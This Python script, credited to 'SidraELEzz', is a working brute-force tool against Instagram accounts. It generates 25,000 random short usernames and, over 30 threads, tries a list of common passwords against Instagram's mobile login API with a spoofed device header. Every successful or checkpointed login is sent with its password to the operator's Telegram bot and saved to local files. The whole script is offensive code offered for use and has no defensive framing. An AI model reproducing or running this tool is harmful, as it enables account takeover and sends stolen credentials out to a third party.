""" 
-------------------------------------------------------------------------
- Cod BY : SidraELEzz
- Github : https://github.com/SidraELEzz
- Telegram: https://t.me/SidraTools
- Telegram: https://t.me/tt_rq
-------------------------------------------------------------------------
      
""" 

try:
	import requests, uuid, os, sys, time,json,random,re,concurrent.futures,uuid
	from uuid import uuid4
	from concurrent.futures import ThreadPoolExecutor
except ImportError:
	os.system("pip install requests")
	
	
	
	
A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"

def baner():
	banera =f"""{E}
	
     888      .d88888b.   .d8888b.  888    d8P  
     888     d88P" "Y88b d88P  Y88b 888   d8P   
     888     888     888 888    888 888  d8P    
     888     888     888 888        888d88K     
     888     888     888 888        8888888b    
     888     888     888 888    888 888  Y88b   
     888     Y88b. .d88P Y88b  d88P 888   Y88b  
     88888888 "Y88888P"   "Y8888P"  888    Y88b 
                                                                                                 
  \033[1;93m < \033[1;92mTHE TOOL IS FREE\033[1;93m >  \033[1;91m 
 ---------------------------
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mAUTHOR     : SIDRA ELEZZ
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mTelegram   : SIDRATOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mYOUTUBE    : TERMUX TOOLS
 \033[1;91m(\033[1;92m⌯\033[1;91m) \033[1;97mGITHUB     : GITHUB.COM/SIDRAELEZZ\033[1;91m
  ---------------------------
"""     

	for sidra in banera.splitlines():
		time.sleep(0.05)
		print(sidra)
		
def clear():
	if os.name == 'nt':
		os.system('cls')
		os.system('title Cod BY SidraELEzz ')
	else:
		os.system('clear')

ok = 0
cp = 0
sk = 0


def Instagram(username,passs,ID,token):
	global ok,cp,sk
	try:
		for password in passs:
			data = {
            'uuid': str(uuid4()),
            'password': password,
            'username': username,
            'device_id': str(uuid4()),
            'from_reg': 'false',
            '_csrftoken': 'missing',
           'login_attempt_countn': '0'}
			headers = {
            'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-Connection-Type": "WIFI",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            'Host': 'i.instagram.com',
            'Connection': 'keep-alive' }
			url = "https://i.instagram.com/api/v1/accounts/login/"
			login = requests.post(url,headers=headers,data=data,allow_redirects=True,verify=True)
			#print (login.text)
			if str("logged_in_user") in login.text:
				ok+=1
				massage = ("• Account Successful ✓ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ⌯ username : "+str(username)+"\n ⌯ password : "+str(password)+"\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nTele ➥• @SidraTools")
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(massage))
				open("Account-ok.txt", "a").write(f"{massage}\n")
				
				
			elif str('"message":"challenge_required","challenge"') in login.text:
				cp+=1
				massag = ("• Account CheckPoint ✓ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n ⌯ username : "+str(username)+"\n ⌯ password : "+str(password)+"\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nTele ➥• @SidraTools")
				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(massage))
				open("Account-cp.txt", "a").write(f"{massag}\n")
				
			else:
				sk+=1
				print(E+" \r[•] OK : " +str(ok)+C+" [•] CP : " +str(cp)+H+" [•] USER : "+E +str(username)+B+" [•] Hit : " +str(sk),end= '')
		
	except:pass
	
def Sakura():
	clear();baner()
	token = input(E+"("+C+"⌯"+E+") "+C+"TOKEN BOT DANE :"+B)
	ID = input(E+"("+C+"⌯"+E+") "+C+"ID TELEGRAM YOU :"+B)
	f = "mnbvc_xzlkjhgfds.apoiuytrewq0987654321"
	clear();baner()
	apk = "list.txt"
	os.system(f"rm -rf {apk}")
	op=open('list.txt','w')
	for x in range(25000):
		x1 = random.choice(f)
		x2 = random.choice(f)
		x3 = random.choice(f)
		x4 = random.choice(f)
		user = str(x1)+str(x2)+str(x3)+str(x4)
		op.write(str(user)+"\n")
		
	fil = "list.txt"
	file = open(fil, 'r')
	clear();baner()
	print ("")
	while True:
		username = file.readline().split('\n')[0]
		if username == '':
			print(H+"The examination has been completed.   "+E+fil)
			break
			
		with ThreadPoolExecutor(max_workers=30) as sidraelezz:
			pas1= username+"123"
			pas2= "1q2w3e4r5t"
			pas3= "Aa123123"
			pas4= "1111aaaa"
			pas5= "20012001"
			pas6= "19981998"
			pas7= "1234qwer"
			pas8= "10001000"
			litpas=[
		    str(pas1),
		    str(pas2),
		    str(pas3),
		    str(pas4),
		    str(pas5),
		    str(pas6),
		    str(pas7),
		    str(pas8)]
			litpas.append('786786')
			litpas.append('abc123')
			litpas.append('instagram')
			litpas.append('live')
			passs = set(litpas)
			sidraelezz.submit(Instagram,username,passs,ID,token)
			
			
			#for passs in set(litpas):
				
				

		
		
		
Sakura()
""" 
-------------------------------------------------------------------------
- Cod BY : SidraELEzz
- Github : https://github.com/SidraELEzz
- Telegram: https://t.me/SidraTools
- Telegram: https://t.me/tt_rq
-------------------------------------------------------------------------
     
""" 